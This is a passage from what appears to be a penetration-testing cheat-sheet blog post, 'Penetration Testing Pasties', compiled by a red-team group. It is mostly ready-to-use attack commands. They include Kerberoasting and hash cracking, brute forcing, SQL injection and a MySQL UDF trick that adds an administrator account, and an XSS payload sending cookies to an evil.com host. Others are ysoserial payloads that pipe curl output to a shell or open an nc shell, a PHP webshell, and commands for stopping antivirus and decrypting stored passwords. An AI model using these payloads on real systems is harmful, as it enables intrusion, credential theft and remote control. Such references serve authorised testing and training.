hashes remotely via Volume Shadow Copy 1 c : \\ users \\ username \\ appdata \\ local \\ temp \\ sd . exe domain / username : password @dchostname - just - dc - use - vss - outputfile GetUserSPNS.py \u00b6 This is the easiest way to gather SPN tickets in the correct format for cracking with John or Hashcat Source: https://room362.com/post/2016/kerberoast-pt2/ 1 2 3 4 5 6 7 8 9 10 11 root @wpad : ~/ impacket / examples # . / GetUserSPNs . py - request sittingduck . info / notanadmin - dc - ip < target DC ip address > Impacket v0 .9.15 - dev - Copyright 2002 - 2016 Core Security Technologies Password : ServicePrincipalName Name MemberOf PasswordLastSet ---------------------------------- ---------- ---------------------------------------------------- ------------------- http / win10 . sittingduck . info uberuser CN = Enterprise Admins , CN = Users , DC = sittingduck , DC = info 2015 - 11 - 10 23 : 47 : 21 MSSQLSvc / WIN2K8R2 . sittingduck . info sqladmin01 2016 - 05 - 13 19 : 13 : 20 $ krb5tgs $ 23 $ * sqladmin01 $ SITTINGDUCK . INFO $ SPN * $ 6e5307 df490c6e3339f613fdc5655785 $ 80 ba233b4d24531202f2e354c99e7eda807bde7aeeb48ee4cdb6bf809d78652413699e3cff8b9b78b9ee70e997a538155fc7f72e208d715020d458b8413d4b12b212738833c4694d84937d65cb8ecd0020c00a5d39c07da35a748ea2cb062fca4fa9b282e7046d70ee1cae4cfee7d6f791052e283 $ krb5tgs $ 23 $ * uberuser $ SITTINGDUCK . INFO $ SPN * $ 27 c08ed2a8d5394f66e8c13c25c98393 $ 310 b787ec5c10b20fcc0acb1406b6a6e2ffddd71de3dc4c70c19e5dfcf262cc88574e61cb3940ebfd574b2bb555f2b05f84d8526e3cf46fc0ca57e03467729757cbf79da9f55cde9dabdda68e80dce6564e9f1b904b0585dbc813b82abf89e973e41c102b664f4c649f85acaf7904a273dddcb9315a66f27334f313190e1caf4f5055b671d250f5912cc1871a1dd4a6126087ddfb98ade8f7dde495ee8ad76583aa5a12eef63a690dd82a15eaaca0d7594f2f1dbc899035d89dd628b291590058cfb3405d1dfe4a383be5704465d9c8972ef8f1cba3541fdfa7dcf5063eaed74051fa18bd73f7b4f7d77 SMBRelayx.py \u00b6 https://pen-testing.sans.org/blog/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python/?utm_medium=Social&utm_source=Twitter&utm_content=SANSPenTest+BLOG+SMB+Relay+Demystified&utm_campaign=SANS+Pen+Test Brute Force Techniques \u00b6 RDP Brute 1 ncrack - u administrator - P 500 - worst - passwords . txt - p 3389 10 . 212 . 50 . 21 SSH Brute 1 medusa - M ssh - C / usr / share / wordlists / ssh . lst - H 22 . txt - T 10 | grep SUCCESS | tee medusa - results . txt Telnet Brute 1 medusa - M telnet - C / usr / share / wordlists / telnet . lst - H 23 . txt - T 10 - t 3 | grep SUCCESS | tee medusa - results . txt Web Exploitation \u00b6 SQL \u00b6 SQLi Examples \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 secret ' or 1=1 limit1;# # Find number of columns return by the Select statement ? id = 738 order by 1 , 2 , 3 , 4 ... n until error is received # Use union select statement to append query to the original # union Select statement must have same number of columns as original Select statement ? id = 738 union select 1 , 2 , 3 , 4 , 5 , 6 # Get DB Version ? id = 738 union select 1 , 2 , 3 , 4 ,@@ version , 6 # Get DBUser ? id = 738 union select 1 , 2 , 3 , 4 , user () , 6 # Get tables from all databases ? id = 738 union all select 1 , 2 , 3 , 4 , table_name , 6 FROM information_schema . tables # Get Table Columns ? id = 738 union select 1 , 2 , 3 , 4 , column_name , 6 FROM information_schema . columns where table_name = ' users ' # Get User passwords ? id = 738 union select 1 , 2 , 3 , 4 , concat ( name , 0 x3a , password ) , 6 FROM users SQL Joins \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # FULL All SELECT something FROM tableA A FULL OUTER JOIN tableB B ON A . KEY = B . KEY # A partial B SELECT something FROM tableA A LEFT JOIN tableB B on A . Key = B . Key # B Partial A SELECT something FROM tableA A RIGHT JOIN tableB B on A . Key = B . Key # A no B SELECT something FROM tableA A LEFT JOIN tableB B on A . Key = B . Key WHERE B . Key IS NULL # Outer SELECT something FROM tableA A FULL OUTER JOIN tableB B on A . Key = B . Key WHERE A . Key IS NULL OR B . Key IS NULL # Inner SELECT something FROM tableA A FULL INNER JOIN tableB B on A . Key = B . Key MySQL \u00b6 1 2 3 4 5 6 7 8 9 10 [ mysqldir ] / bin / mysql - h hostname - u root -- password = pass < database > select @@ version select @@ servername mysql > show databases ; mysql > use [ db name ]; mysql > show tables ; mysql > describe [ table name ]; mysql > SELECT * FROM [ table name ]; UDF Install for Command Execution \u00b6 User Defined Functions by Platform 1 2 3 4 udf / mysql / linux / 32 / lib_mysqludf_sys . so udf / mysql / linux / 64 / lib_mysqludf_sys . so udf / mysql / windows / 32 / lib_mysqludf_sys . dll udf / mysql / windows / 64 / lib_mysqludf_sys . dll Source: http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/ Load MYSQLUDF for Linux 1 2 3 4 5 6 7 8 use test ; create table udf ( line blob ); insert into udfvalues ( load_file ( '/tmp/udf/udf.so' )); select * from udfinto dumpfile '/usr/lib/udf.so' ; create function sys_exec returns integer soname 'udf.so' ; select sys_exec ( 'id > /tmp/out; chownapache.apache /tmp/out' ); select sys_exec ( 'ls -alh/root/Desktop/ >> /tmp/out' ); select sys_exec ( 'ls /etc/sudoers>> /tmp/out' ); Upload suid.c program 1 2 3 wget http : // ip : port / privex / mysql / suid - o / tmp / suid chownroot : root / tmp / suid chmod4777 / tmp / suid Load MYSQLUDFfor Windows 1 2 3 4 5 6 7 8 USE mysql ; CREATE TABLE npn ( line blob ); INSERT INTO npn values ( load_files ( 'C://xampplite//webdav//lib_mysqludf_sys.dll' )); SELECT * FROM mysql . npnINTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll' ; CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll' ; SELECT sys_exec ( \"net user hacker hacker1234!@#$ /add\" ); SELECT sys_exec ( \"net localgroupAdministrators hacker /add\" ); s_exec ( 'net localgroup\"Remote Desktop Users\" hacker /add' ); SQLMap \u00b6 Automated website crawl and test of SQLi 1 python sqlmap . py - u http : // example . com --forms --batch --crawl=10 --cookie=jsessionid=12345 --level=5 --risk=3 XSS \u00b6 Grab cookie 1 document . write ( '<img src=\"https://yourserver.evil.com/collect.gif?cookie=' + document . cookie + '\" />' ) XSS via image tag 1 < img src = \"x\" onerror = \"alert('Suck it, Trebek!')\" /> Server-side Javascript Injection via Node or ElementJS \u00b6 File system directory listing 1 res . end ( require ( ' fs ' ) . readdirSync ( ' . ' ) . toString ()) File read 1 res . end ( require ( ' fs ' ) . readFileSync ( ' /etc/passwd ' ) . toString ()) Cold Fusion \u00b6 Sources: JMPESPJUMP - Attacking Adobe Cold Fusion Decrypt CFM Files back to source https://github.com/disccomp/cfdecrypt CF RDS Logon Bypass (Create this html file locally and submit to obtain a auth session) 1 2 3 4 5 <form action= \"http://[HOSTNAME:PORT]/CFIDE/adminapi/administrator.cfc?method=login\" method= \"post\" > <input name= \"adminpassword\" type= \"hidden\" value= \"\" /> <input name= \"rdsPasswordAllowed\" type= \"hidden\" value= \"1\" /> <input type= \"submit\" /> </form> For ColdFusion 6 and 7 the passwords for DataSources encrypted in the following XML files: [ColdFusion_Install_Dir]\\lib\\neo-query.xml For ColdFusion 8, 9 and 10: [ColdFusion_Install_Dir]\\lib\\neo-datasource.xml Java \u00b6 JBOSS \u00b6 Default credential is \"admin:admin\" 1 2 3 4 5 0 . Host your . jar / . war payload with webshell on local webserver 1 . Navigate to the JMX Console on the target host ( http : // IP . Ad . dr . ess : port / jmx - console / ) and search for \u201c service = MainDeployer \u201d. 2 . From here you \u2019 ll want to utilize the deploy () function since it allows you to enter a URL as a parameter value in java . net . URL . In this field , enter your attack IP and the name of the WAR file in the URL box and then click the \u201c Invoke \u201d button . Other ways to gain execution 1 2 3 4 5 6 7 8 * jboss . deployment * jboss . system ( MainDeployer ) * http : // localhost : 8080 / invoker / JMXInvokerServlet * Java Deserialization Vuln via JMXInvokerServlet * https : // www . redteam - pentesting . de / en / publications / jboss /- bridging - the - gap - between - the - enterprise - and - you - or - whos - the - jboss - now * https : // github . com / frohoff / ysoserial * https : // jitpack . io / com / github / frohoff / ysoserial / master - SNAPSHOT / ysoserial - master - SNAPSHOT . jar * https : // www . cigital . com / blog / mitigate - java - deserialization - vulnerability - jboss / Auto-check and exploitation tool ( https://github.com/joaomatosf/jexboss ) 1 2 3 4 5 git clone https : // github . com / joaomatosf / jexboss . git cd jexboss pip install - r requires . txt python jexboss . py - h python jexboss . py - host http : // target_host : 8080 Java Deserialization \u00b6 Java Deserialization Cheat Sheet How to get a full shell through Java Runtime.exec Ysoserial payload to execute full commands 1 sh - c $ @| sh . < payload here > Generate a ysoserial payload to tell server to download further commands via curl and pipe to shell 1 java - jar ysoserial - 0 . 0 . 4 - all . jar CommonsCollections1 'sh -c $@|sh . curl http://10.42.65.40/commands.sh |sh' > jenkins_curl_shell . bin Generate a ysoserial payload to execute nc bind shell 1 java - jar ysoserial - 0 . 0 . 4 - all . jar CommonsCollections1 'sh -c $@|sh . nc -lp 8088 -e /bin/bash' > nc - jenkins . out JMXInvokerServlet \u00b6 1 . / ysoserial - master - v0 . 0 . 4 - gad26e2b - 61 . jar CommonsCollections5 \"touch /tmp/pwned\" > payload . txt Generate payload with yososerial and send with Burp. You will get a jboss.invocation.InvocationException response on success or failure. Ensure the headers match these: 1 2 3 4 POST / invoker / JMXInvokerServlet HTTP / 1 . 1 Host : < hostname / IP > : 8080 Content-Type : application / x-java-serialized-object ; class = org . jboss . invocation . MarshalledValue Content-Length : 2083 PHP \u00b6 LFI Read File (without executing) 1 www . example . com / index . php ? page = php : // filter / read = convert . base64 - encode / resource = config . php LFI Read PHP session file for current sessionid 1 http : // blog . target . org / blog . php ? page =/ var / lib / php5 / sess_th3cr1i5cm6m3dq98pb2sn9qg5 Create PHP backdoor/shell (windows): 1 echo ^ <?php echo passthru ( $_GET [ 'cmd' ]); ?^> > C : \\inetpub\\wwwroot\\s . php PHP Command Execution Example 1 2 3 4 Url / page . php ? page = system & help = cmd @extract ( $ _REQUEST ); @die ( $ page ( $ help )); PHP Type Juggling \u00b6 Bypass login authentication with PHP Type juggling by forcing a null condition in a string comparison. Add [] after a POST parameter \"?user_id[]=user22\" to force a NULL (zero-like) condition when comparing a string and an array Web Sockets \u00b6 There are still relatively few dec ent Web Socket testing tools and most aren't very mature: BurpSuite - Limited options to view web socket communication, but no ability to edit or replay traffic ZAP Proxy - Ability to modify, replay, and fuzz web sockets, but still relatively clumsy WSSiP - WebSocket Manipulation Proxy - Application for capturing, modifying and sending custom WebSocket data from client to server and vice versa. Misc \u00b6 Things that don't seem to fit elsewhere! Decompiling .NET Binaries \u00b6 http://ilspy.net/ Canary Tokens \u00b6 Tokens consist of a unique identifier (which can be embedded in either HTTP URLs or in hostnames.) Whenever that URL is requested, or the hostname is resolved, we send a notification email to the address tied to the token. You can get one in seconds, using just your browser. To obtain a token: 1 2 3 4 5 1 . Visit http : // canarytokens . org . 2 . Enter your email address . ( It ' s only used to notify you when the token is triggered, mails are not used for any other purpose.) 3 . Enter a comment which describes where you ' re using the token. If the token is triggered in six months time, a comment will help you remember where you placed the token. Be specific (e.g. \"file watch on 192.168.100.2:/repos/repo3/README.txt\" or \"Password lure email in user@domain.com inbox\". We envisage having loads of tokens, so a good description is necessary. 4 . Click \" Generate Token \" to obtain your token . 5 . Copy the token and drop it somewhere it will be stumbled over . Canarytokens.org Python SSL Web Server \u00b6 Create PEM file 1 openssl req - newkey rsa : 2048 - x509 - keyout cakey . pem - out cacert . pem - days 3650 To concatenate the private key and public certificate into a pem file (which is required for many web-servers ) : 1 cat cakey . pem cacert . pem > server . pem Python code 1 2 3 4 5 6 import BaseHTTPServer , SimpleHTTPServer import ssl httpd = BaseHTTPServer . HTTPServer (( 'localhost' , 4443 ), SimpleHTTPServer . SimpleHTTPRequestHandler ) httpd . socket = ssl . wrap_socket ( httpd . socket , certfile = './server.pem' , server_side = True ) httpd . serve_forever () McAfee SiteList.xml decryption \u00b6 Sometimes DA and other admin level account passwords are stored in Sitelist.xml files on local hosts 1 2 3 4 5 type \"C:\\ProgramData\\McAfee\\Common Framework\\SiteList.xml\" | findstr Password \u2570 $ . / mcafee_sitelist_pwd_decrypt . py f2mwBTzPQdtnY6QNOsVexH9psAU8z0HbZ2OkDTrFXsR / abAFPM9B3Q == Crypted password : f2mwBTzPQdtnY6QNOsVexH9psAU8z0HbZ2OkDTrFXsR / abAFPM9B3Q == Decrypted password : < empty > https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/privesc/Get-SiteListPassword.ps1 1 git clone https : // github . com / funoverip / mcafee - sitelist - pwd - decryption TightVNC Password Retrieval \u00b6 Retrieve TightVNC registry keys 1 reg query HKEY_LOCAL_MACHINE \\ SOFTWARE \\ TightVNC \\ server Copy password from reg query output 1 2 Password REG_BINARY 7228098734 BBBA06 ControlPassword REG_BINARY 435 D7A037B9FDC2B Download vncpwd.exe or other VNC password decoder 1 wine vncpwd . exe 7228098734 BBBA06 Password Lists \u00b6 https://github.com/danielmiessler/SecLists.gits AIX Passwords \u00b6 /etc/security/passwd Convert AIX passwd file to john format 1 cat $ 1 | egrep \":|password\" | sed 's/password = //g' | tr - d \"\\t \" | sed ':a;N;$!ba;s/:\\n/:/g' Create NTLM Hash from Mac CLI \u00b6 1 echo - n password | iconv - t UTF - 16 LE | openssl md4 Hash Cracking Examples \u00b6 ophcrack using tables 1 ophcrack - d / Volumes / data / table_vista_free / - t / Volumes / data / table_vista_free - f ~/ Desktop / ntlm . hashdump Crack mscachev2 format with Hashcat (extremely slow) 1 . / hashcat - m 2100 - a 0 mscachev2 . dump . / wordlists /* -r rules/dive.rule Hashcat SPNs with wordlist 1 . / hashcat - m 13100 - a 0 spns . dump . / wordlists /* -r rules/dive.rule JTR SPNs with wordlist 1 . / john --format=krb5tgs spns.dump --wordlist= Magic Hashes \u00b6 Source: https://www.whitehatsec.com/blog/magic-hashes/ Use Case 1: Use the \u201cMagic\u201d Number below as a password or as a string that you expect to be hashed. When it is compared against the hash of the actual value, and if they both are treated as \u201c0\u201d and therefore evaluated as true, you will be able to log into the account without the valid password. This could be forced to happen in environments where automatic passwords are chosen for users during a forgot password flow and then attempting to log in immediately afterwards, as an example. https://example.com/login.php?user=bob&pass=240610708 Use Case 2: The attacker can simply take the example in the Hash column in the table below and use it as a value. In some cases these values are simply done as a look-up against known values (in memory, or perhaps dumped from a database and compared). By simply submitting the hash value, the magic hash may collide with other hashes which both are treated as \u201c0\u201d and therefore compare to be true. This could be caused to happen https://example.com/login.php?user=bob&token=0e462097431906509019562988736854 Hashes 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 HashType HashLength \u201c Magic \u201d Number Magic Hash Found By md2 32 505144726 0 e015339760548602306096794382326 WhiteHat Security , Inc . md4 32 48291204 0 e266546927425668450445617970135 WhiteHat Security , Inc . md5 32 240610708 0 e462097431906509019562988736854 Michal Spacek sha1 40 10932435112 0 e07766915004133176347055865026311692244 Independently found by Michael A . Cleverly & Michele Spagnuolo & Rogdham sha224 56 sha256 64 sha384 96 sha512 128 ripemd128 32 315655854 0 e251331818775808475952406672980 WhiteHat Security , Inc . ripemd160 40 20583002034 00 e1839085851394356611454660337505469745 Michael A Cleverly ripemd256 64 ripemd320 80 whirlpool 128 tiger128 , 3 32 265022640 0 e908730200858058999593322639865 WhiteHat Security , Inc . tiger160 , 3 40 13181623570 00 e4706040169225543861400227305532507173 Michele Spagnuolo tiger192 , 3 48 tiger128 , 4 32 479763000 00 e05651056780370631793326323796 WhiteHat Security , Inc . tiger160 , 4 40 62241955574 0 e69173478833895223726165786906905141502 Michele Spagnuolo tiger192 , 4 48 snefru 64 snefru256 64 gost 64 adler32 8 FR 00 e00099 WhiteHat Security , Inc . crc32 8 2332 0 e684322 WhiteHat Security , Inc . crc32b 8 6586 0 e817678 WhiteHat Security , Inc . fnv132 8 2186 0 e591528 WhiteHat Security , Inc . fnv164 16 8338000 0 e73845709713699 WhiteHat Security , Inc . joaat 8 8409 0 e074025 WhiteHat Security , Inc . haval128 , 3 32 809793630 00 e38549671092424173928143648452 WhiteHat Security , Inc . haval160 , 3 40 18159983163 0 e01697014920826425936632356870426876167 Independently found by Michael Cleverly & Michele Spagnuolo haval192 , 3 48 48892056947 0 e4868841162506296635201967091461310754872302741 Michael A . Cleverly haval224 , 3 56 haval256 , 3 64 haval128 , 4 32 71437579 0 e316321729023182394301371028665 WhiteHat Security , Inc . haval160 , 4 40 12368878794 0 e34042599806027333661050958199580964722 Michele Spagnuolo haval192 , 4 48 haval224 , 4 56 haval256 , 4 64 haval128 , 5 32 115528287 0 e495317064156922585933029613272 WhiteHat Security , Inc . haval160 , 5 40 33902688231 00 e2521569708250889666329543741175098562 Michele Spagnuolo haval192 , 5 48 52888640556 0 e9108479697641294204710754930487725109982883677 Michele Spagnuolo haval224 , 5 56 haval256 , 5 64","title":"Penetration Testing Pasties"},{"location":"blogs/2019/penetration-testing-pasties/#penetration-testing-pasties","text":"James Tubberville | January 11, 2019 | Tweet This Post: 'Pasties' started as a small file used to collect random bits of information and scripts that were common to many individual tests. Most of this is just a consolidation of publicly available information and things that Joe Vest ( @joevest ), Andrew Chiles ( @andrewchiles ), Derek Rushing, or myself ( @minis_io ) have found useful. Over time additional sections, section placeholders, snippets, and links were added for \"quick reference\" and has grown to quite a sizable markdown file. The more complex or longer sections will be separated into smaller more detailed write-ups; however, we decided to drop the short and generic info for public use now. Pasties data will also eventually be formatted and added to the wiki. As usual, you can find an updated version of pasties (and other tools) on GitHub: https://github.com/threatexpress . Penetration Testing Framework http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html Penetration Testing Execution Standard http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines Good writeup on passive information gathering http://www.securitysift.com/passive-reconnaissance/ Password Breach Database, requires subscription https://leakbase.pw/","title":"Penetration Testing Pasties"},{"location":"blogs/2019/penetration-testing-pasties/#foca","text":"","title":"FOCA"},{"location":"blogs/2019/penetration-testing-pasties/#maltego","text":"","title":"Maltego"},{"location":"blogs/2019/penetration-testing-pasties/#reconng","text":"","title":"ReconNG"},{"location":"blogs/2019/penetration-testing-pasties/#metagoofil","text":"Source: http://resources.infosecinstitute.com/kali-reporting-tools/#gref Metagoofil is an information gathering tool designed for extracting metadata of public documents (pdf,doc,xls,ppt,docx,pptx,xlsx) related to a target domain. It can give a lot of important information by scanning the obtained files. It can generate an HTML page with the result of the metadata extracted, plus a list of potential usernames, very useful for preparing a brute force attack on open services like ftp, web application, VPN, pop3, etc. Metagoofil performs the following: Searches the given file type using the Google search engine Downloads all the documents found Extracts metadata from downloaded documents Saves the result in HTML file Perform document metadata searching on target domain using first 200 google results 1 metagoofil - d < target > . com - t pdf , doc , xls , ppt , odp , ods , docx , xlsx , pptx - l 200 - n 5 - o / tmp / metagoofil / - f / tmp / metagoofil / result . html","title":"Metagoofil"},{"location":"blogs/2019/penetration-testing-pasties/#censysio","text":"Censys is a search engine that allows computer scientists to ask questions about the devices and networks that compose the Internet. Driven by Internet-wide scanning, Censys lets researchers find specific hosts and create aggregate reports on how devices, websites, and certificates are configured and deployed. Create an account and get an API key for use in ReconNG or manual searching https://censys.io/ipv4?q= Python API 1 2 3 4 5 6 7 8 9 10 # pip install censys import censys.ipv4 c = censys . ipv4 . CensysIPv4 ( api_id = \"Get from MyAccount at censys.io\" , api_secret = \"Get from MyAccount at censys.io\" ) ranges = [ \"X.X.X.0/24\" , \"X.X.X.0/24\" , \"X.X.X.0/24\" ] for range in ranges : results = c . search ( range ) for result in results : for port in result [ \"protocols\" ]: print result [ \"ip\" ] + \",\" + port","title":"censys.io"},{"location":"blogs/2019/penetration-testing-pasties/#network-scanning","text":"","title":"Network Scanning"},{"location":"blogs/2019/penetration-testing-pasties/#dsnrecon","text":"Normal dns reverse lookup of IP range with CSV output 1 dnsrecon - t rvl - r 1 . 2 . 3 . 4 / 24 - c output . csv Perform default enumeration of a domain 1 dnsrecon - d < domain > Perform zone transfer attempt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 dnsrecon - t axfr - d < domain > \u2570 $ dnsrecon - h Version : 0 . 8 . 10 Usage : dnsrecon . py < options > Options : - h , -- help Show this help message and exit . - d , -- domain < domain > Target domain . - r , -- range < range > IP range for reverse lookup brute force in formats ( first - last ) or in ( range / bitmask ) . - n , -- name_server < name > Domain server to use . If none is given , the SOA of the target will be used . - D , -- dictionary < file > Dictionary file of subdomain and hostnames to use for brute force . - f Filter out of brute force domain lookup , records that resolve to the wildcard defined IP address when saving records . - t , -- type < types > Type of enumeration to perform : std SOA , NS , A , AAAA , MX and SRV if AXRF on the NS servers fail . rvl Reverse lookup of a given CIDR or IP range . brt Brute force domains and hosts using a given dictionary . srv SRV records . axfr Test all NS servers for a zone transfer . goo Perform Google search for subdomains and hosts . snoop Perform cache snooping against all NS servers for a given domain , testing all with file containing the domains , file given with - D option . tld Remove the TLD of given domain and test against all TLDs registered in IANA . zonewalk Perform a DNSSEC zone walk using NSEC records . - a Perform AXFR with standard enumeration . - s Perform a reverse lookup of IPv4 ranges in the SPF record with standard enumeration . - g Perform Google enumeration with standard enumeration . - w Perform deep whois record analysis and reverse lookup of IP ranges found through Whois when doing a standard enumeration . - z Performs a DNSSEC zone walk with standard enumeration . -- threads < number > Number of threads to use in reverse lookups , forward lookups , brute force and SRV record enumeration . -- lifetime < number > Time to wait for a server to response to a query . -- db < file > SQLite 3 file to save found records . -- xml < file > XML file to save found records . -- iw Continue brute forcing a domain even if a wildcard records are discovered . - c , -- csv < file > Comma separated value file . - j , -- json < file > JSON file . - v Show attempts in the brute force modes .","title":"dsnrecon"},{"location":"blogs/2019/penetration-testing-pasties/#theharvester","text":"Perform lookup against with additional DNS reverse on all ranges discovered 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 theharvester - d < domain > - c - n - b google - l 1000 [ - f output ] Usage : theharvester options - d : Domain to search or company name - b : data source : google , googleCSE , bing , bingapi , pgp linkedin , google - profiles , people123 , jigsaw , twitter , googleplus , all - s : Start in result number X ( default : 0 ) - v : Verify host name via dns resolution and search for virtual hosts - f : Save the results into an HTML and XML file - n : Perform a DNS reverse query on all ranges discovered - c : Perform a DNS brute force for the domain name - t : Perform a DNS TLD expansion discovery - e : Use this DNS server - l : Limit the number of results to work with ( bing goes from 50 to 50 results , - h : use SHODAN database to query discovered hosts google 100 to 100 , and pgp doesn ' t use this option) Examples : theharvester - d microsoft . com - l 500 - b google theharvester - d microsoft . com - b pgp theharvester - d microsoft - l 200 - b linkedin theharvester - d apple . com - b googleCSE - l 500 - s 300","title":"TheHarvester"},{"location":"blogs/2019/penetration-testing-pasties/#nmap","text":"https://github.com/bluscreenofjeff/CCDC-Scripts/blob/master/OpsPlan2016.txt Host discovery 1 2 3 4 nmap - sn - n < targets > nmap - A < host > ( run this second ) nmap - sV - F nmap - p - - sV - O - T4 - v7 - sC Open SMB shares 1 nmap --script=smb-enum-shares -p445 Open NFS Shares 1 nmap - p 111 , 2049 --script nfs-ls,nfs-showmount UDP scan: 1 nmap - sU - F - Pn - v - d - sC - sV --open --reason -T5 <targets> Anonymous FTP 1 2 nmap - sC - sV - p21 nmap - sV - n - sS - Pn - vv --open -p21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 <targets> VNC Brute 1 nmap --script=vnc-brute -p5800,5900 Rawr Scan 1 nmap - sV --open -T4 -v7 -p80,280,443,591,593,981,1311,2031,2480,3181,4444,4445,4567,4711,4712,5104,5280,5800,5988,5989,7000,7001,7002,8008,8011,8012,8013,8014,8042,8069,8080,8081,8243,8280,8281,8531,8887,8888,9080,9443,11371,12443,16080,18091,18092 -iL live-hosts.txt -oA web MSSQL Scan 1 nmap - vv - sV - Pn - n - p1433 --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=1433,smsql.username-sa,mssql.password-sa <targets> -oA <outfile> HTTP Scan 1 nmap - vv - sS - Pn - n - p80 , 443 , 8080 --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-email-harvest,http-methods,http-method-tamper,http-passwd,http-robots.txt <targets> -oA <outfile>","title":"Nmap"},{"location":"blogs/2019/penetration-testing-pasties/#ids-evasion","text":"Append extra random data to change default packet lengths 1 \u2013 data - length 15 Randomize scan order 1 - randomize - hosts","title":"IDS Evasion"},{"location":"blogs/2019/penetration-testing-pasties/#web","text":"","title":"Web"},{"location":"blogs/2019/penetration-testing-pasties/#eyewitness","text":"Get the most recent version 1 git clone https : // github . com / ChrisTruncer / EyeWitness . git Faster Scan 1 . / EyeWitness . py --web -f hosts.txt --timeout 5 --threads 10 -d /mnt/event/Recon/ew --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https Slow version via proxychains 1 2 3 proxychains . / EyeWitness . py --web -f hosts.txt --timeout 10 --threads 2 -d /mnt/event/Recon/ew --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https proxychains . / EyeWitness . py --web -x nmaphosts.xml --timeout 10 --threads 2 -d /mnt/event/Recon/ew2 --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https Proxychains specify a remote DNS server http://carnal0wnage.attackresearch.com/2013/09/changing-proxychains-hardcoded-dns.html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 On Kali linux its found here : / usr / lib / proxychains3 / proxyresolv # !/ bin / sh # This script is called by proxychains to resolve DNS names # DNS server used to resolve names DNS_SERVER = 4 . 2 . 2 . 2 if [ $# = 0 ] ; then echo \" usage: \" echo \" proxyresolv <hostname> \" exit fi export LD_PRELOAD = libproxychains . so . 3 dig $1 @ $D NS_SERVER + tcp | awk ' /A.+[0-9]+\\.[0-9]+\\.[0-9]/{print $5;} ' Use Canary tokens to identify web front-end vulnerabilities In combination with Burp collaborator, identify configuration issues with web front-end appliances For example, issue request to target domain with a custom Host header pointing to your collaborator/canary: Request: 1 2 3 GET / HTTP / 1 . 1 Host : uniqid . burpcollaborator . net Connection : close Response (on Collaborator): 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 GET / HTTP / 1 . 1 Host : XX . X . XXX . XX : 8082 HTTP / 1 . 1 200 Connection Established Date : Tue , 07 Feb 2017 16 : 32 : 50 GMT Transfer - Encoding : chunked Connection : close Ok / HTTP / 1 . 1 is unavailable Ok Unknown Command Ok Unknown Command Ok Unknown Command Ok Canarytokens.org Blog - Targeting HTTP's Hidden Attack Surface","title":"Eyewitness"},{"location":"blogs/2019/penetration-testing-pasties/#windows","text":"","title":"Windows"},{"location":"blogs/2019/penetration-testing-pasties/#built-in-commands","text":"View your current user: 1 whoami View information about the current user: 1 2 net user myuser ( for a local user ) net user myuser / domain ( for a domain user ) View the local groups: 1 net localgroup View the local administrators: 1 net localgroup Administrators Add a new user: 1 net user myuser mypass / add Add a user in the local Administrators group: 1 net localgroup Administrators myuser / add View the domain name of current machine: 1 2 net config workstation net config server View the name of the domain controller: 1 reg query \"HKEY_LOCAL_MACHINE\\ SOFTWARE\\Microsoft\\Windows\\ CurrentVersion\\Group Policy\\ History\" / v DCName or 1 Import - Module ActiveDirectory ; ( Get - ADDomainController - DomainName corp . test . com - Discover - NextClosestSite ). HostName or 1 set l Get list of DCs 1 nltest / dclist : domainname or 1 netdom query / D : domin DC or 1 dsquery server or 1 nslookup - type = srv _ldap . _tcp . dc . _msdcs . corp . test . com Get DC Info 1 nltest / dsgetdc : domain Get DC site mapping 1 nltest / dsaddresstosite : dcname . corp . test . com Get PDC 1 netdom query / D : domain PDC or 1 nslookup - type = srv _ldap . _tcp . pdc . _msdcs . corp . test . com or get roles Get Roles 1 netdom query / D : domain FSMO List trusts 1 nltest / domain_trust or 1 nltest / trusted_domains or 1 get - adtrust - Filter * Get DC for Trusted Domains 1 $ t = Get - AdTrust - Filter * | Select - expandproperty Name ; foreach ( $ line in $ t ) { nltest / dclist : $ line } View the list of domain users: 1 2 3 4 C : \\ > wmic useraccount where ( domain = '%USERDOMAIN%' ) get Name > userlist . txt PS C : \\ > ( [ adsisearcher ] \"objectCategory=User\" ). Findall () | ForEach {$ _ . properties . samaccountname } | Sort | Out - File - Encoding ASCII users . txt or 1 net user / domain Get domain info (including DC) 1 gpresult / z View the list of domain admins: 1 net group \"Domain Admins\" / domain View domain groups 1 2 net group / domain powershell ( new - object system . directoryservices . directorysearcher ( \"(&(objectcategory=user)(samaccountname=$($env:username)))\" )). FindOne (). GetDirectoryEntry (). memberof View the list of started services (search for antivirus): 1 2 net start sc query Stop a service: 1 net stop \"Symantec Endpoint Protection\" View the list of started processes and the owner: 1 tasklist / v Kill a process by its name: 1 taskkill / F / IM \"cmd.exe\" Abort a shutdown/restart countdown: 1 shutdown / a Download an executable from a remote FTP server: 1 2 3 4 5 6 echo open 10 . 1 . 2 . 3 > C : \\ script . txt echo user myftpuser >> C : \\ script . txt echo pass myftppass >> C : \\ script . txt echo get nc . exe >> C : \\ script . txt echo bye >> C : \\ script . txt ftp - s : script . txt Upload a file to a remote FTP server: 